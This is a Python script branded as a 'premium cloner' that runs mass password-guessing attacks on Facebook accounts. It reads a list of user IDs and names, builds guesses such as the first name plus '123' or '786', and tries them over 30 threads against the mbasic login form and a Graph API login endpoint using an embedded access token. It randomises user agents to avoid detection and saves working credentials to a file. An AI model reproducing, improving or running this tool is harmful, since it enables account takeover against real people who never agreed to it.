# Decode By Error x Ethan 
# Final Fixed Version (Full Script)
import os, requests, json, time, re, random, sys, uuid, platform, httplib2, arrow
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# --- Global Variables ---
loop = 0
oks = []
cps = []
twf = []
plist = []
methods = []

# --- System Colors & Banner ---
def clear():
    os.system('clear')
    print("""
\033[1;32m   ____  _____  _   _           _   _ _   _ ____  
\033[1;32m  / ___|| ____|| \ | |         | | | | | | | __ ) 
\033[1;32m | |  _ |  _|  |  \| |  _____  | |_| | | | |  _ \ 
\033[1;32m | |_| || |___ | |\  | |_____| |  _  | |_| | |_) |
\033[1;32m  \____||_____||_| \_|         |_| |_|\___/|____/ 
\033[1;97m--------------------------------------------------
\033[1;90m [•] DEVELOPER : GEN HUB
\033[1;90m [•] STATUS    : PREMIUM CLONER
\033[1;97m--------------------------------------------------""")

# --- User-Agent Generator (Updated & Strong) ---
def generate_ua():
    android_version = random.choice(['10', '11', '12', '13', '14'])
    device_model = random.choice(['SM-G998B', 'SM-A525F', 'M2012K11AG', 'RMX3311', 'V2109'])
    build = str(random.randint(111111, 999999))
    fba = f"{random.randint(200, 450)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
    fbb = str(random.randint(100000000, 999999999))
    ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model} Build/TP1A.{build}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(100, 125)}.0.{random.randint(4000, 6000)}.{random.randint(10, 150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fba};FBBV/{fbb};]'
    return ua

# --- Utilities ---
def linex():
    print('\033[1;97m--------------------------------------------------')

def tutulx(uid):
    if len(uid) == 15:
        if uid.startswith('100000'): return '2009/2010'
        else: return '2023/2024'
    else: return 'OLD'

# --- Main Menu ---
def Menu():
    clear()
    print(' [1] FILE CLONING (MIX ID)')
    print(' [2] CONTACT OWNER')
    print(' [0] EXIT')
    linex()
    choice = input(' SELECT OPTION : ')
    if choice == '1':
        File_Cloning()
    else:
        sys.exit()

def File_Cloning():
    clear()
    print(' EXAMPLE : /sdcard/file.txt')
    linex()
    file = input(' ENTER FILE PATH : ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(' [!] FILE NOT FOUND'); time.sleep(2); Menu()
    
    clear()
    print(' [1] AUTO PASSWORD (BEST)')
    print(' [2] CHOICE PASSWORD')
    linex()
    p_opt = input(' SELECT : ')
    if p_opt == '1':
        plist.extend(['first123', 'first1234', 'first12345', 'First123', 'firstlast', 'first@123', '57273200', '59039200'])
    else:
        print(' ENTER PASS (comma separated): ')
        plist.extend(input(' > ').split(','))
    
    clear()
    print(' [1] METHOD 1 (M-BASIC)')
    print(' [2] METHOD 2 (GRAPH)')
    linex()
    m_opt = input(' SELECT METHOD : ')
    
    clear()
    print(f' TOTAL IDS : {len(fo)}')
    print(' CLONING STARTED... USE AIRPLANE MODE IF NO OK')
    linex()
    
    with tred(max_workers=30) as pool:
        for user in fo:
            try:
                ids, names = user.split('|')
                if m_opt == '1':
                    pool.submit(M1, ids, names)
                else:
                    pool.submit(M2, ids, names)
            except: pass

# --- Cloning Method 1 ---
def M1(ids, names):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;97m [GEN] %s | OK:%s | CP:%s '%(loop, len(oks), len(cps))); sys.stdout.flush()
    try:
        fn = names.split(' ')[0].lower()
        ln = names.split(' ')[1].lower() if ' ' in names else fn
        for pw in plist:
            pas = pw.replace('first', fn).replace('last', ln).replace('First', fn.capitalize())
            ua = generate_ua()
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0", "unrecognize_upgrade": "0", "email": ids, "pass": pas, "login": "Log In"
            }
            header_freefb = {
                'authority': 'mbasic.facebook.com', 'method': 'POST', 'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://mbasic.facebook.com',
                'referer': 'https://mbasic.facebook.com/', 'user-agent': ua
            }
            session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data=log_data, headers=header_freefb)
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                print(f'\r\033[1;32m [GEN-OK] {ids} | {pas} \033[1;97m')
                oks.append(ids)
                open('/sdcard/GEN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            elif 'checkpoint' in log_cookies:
                # print(f'\r\033[1;33m [GEN-CP] {ids} | {pas} \033[1;97m')
                cps.append(ids)
                break
        loop += 1
    except:
        pass

# --- Cloning Method 2 ---
def M2(ids, names):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;97m [GEN] %s | OK:%s | CP:%s '%(loop, len(oks), len(cps))); sys.stdout.flush()
    try:
        fn = names.split(' ')[0].lower()
        ln = names.split(' ')[1].lower() if ' ' in names else fn
        for pas in [fn+'123', fn+'1234', fn+'12345', names.lower(), fn+'786']:
            ua = generate_ua()
            data = {
                "adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()),
                "cpl": "true", "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled", "source": "device_based_login_password",
                "email": ids, "password": pas, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1", "meta_inf_fbmeta": "", "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0", "locale": "en_GB", "client_country_code": "GB", "method": "auth.login"
            }
            headers = {
                'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'WIFI',
                'X-TGN-Network-Type': 'WIFI', 'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000))
            }
            res = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\033[1;32m [GEN-OK] {ids} | {pas} \033[1;97m')
                oks.append(ids)
                open('/sdcard/GEN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                cps.append(ids)
                break
        loop += 1
    except:
        pass

if __name__ == "__main__":
    Menu()
